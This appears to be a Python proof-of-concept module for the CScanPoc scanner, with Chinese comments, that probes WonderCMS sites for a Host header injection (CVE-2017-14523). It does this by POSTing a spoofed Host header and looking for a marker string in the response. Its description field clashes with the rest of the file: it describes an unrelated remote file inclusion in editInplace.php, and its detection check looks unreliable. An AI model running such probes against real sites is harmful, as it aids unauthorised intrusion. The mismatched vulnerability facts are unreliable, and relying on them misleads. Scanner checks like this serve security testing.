# coding: utf-8

from CScanPoc.thirdparty import requests
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WonderCMS_0001'  # 平台漏洞编号
    name = 'WonderCMS HTTP主机头注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2018-02-07'  # 漏洞公布时间
    desc = '''
    Wonder CMS是一套开源的内容管理系统（CMS）。
    Wonder CMS 2014版本中的editInplace.php文件存在PHP远程文件包含漏洞。远程攻击者可借助URL中的hook参数执行任意的PHP代码。
    '''  # 漏洞描述
    ref = 'http://www.cnvd.org.cn/flaw/show/CNVD-2018-02927'
    cnvd_id = 'CNVD-2018-02927'  # cnvd漏洞编号
    cve_id = 'CVE-2017-14523'  # cve编号
    product = 'WonderCMS'  # 漏洞组件名称
    product_version = 'WonderCMS WonderCMS 2.3.1'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'e8a32c82-43d4-4684-981c-099fd3c9a99d'  # 平台 POC 编号
    author = '国光'  # POC编写者
    create_date = '2018-08-01'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            arg = '{target}'.format(target=self.target)
            payload = "/"

            vul_url = arg + payload
            headers = {
                'Content-Type': 'application/x-www-form-urlencoded',
                'Host': 'www.sqlsec.com'
            }
            response = requests.post(vul_url, headers=headers)
            self.output.info("正在测试HTTP头注入语句")

            if response.status_code == 200 and '国光' in response.text:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常{}'.format(e))

    def exploit(self):
        self.verify()


if __name__ == '__main__':
    Poc().run()
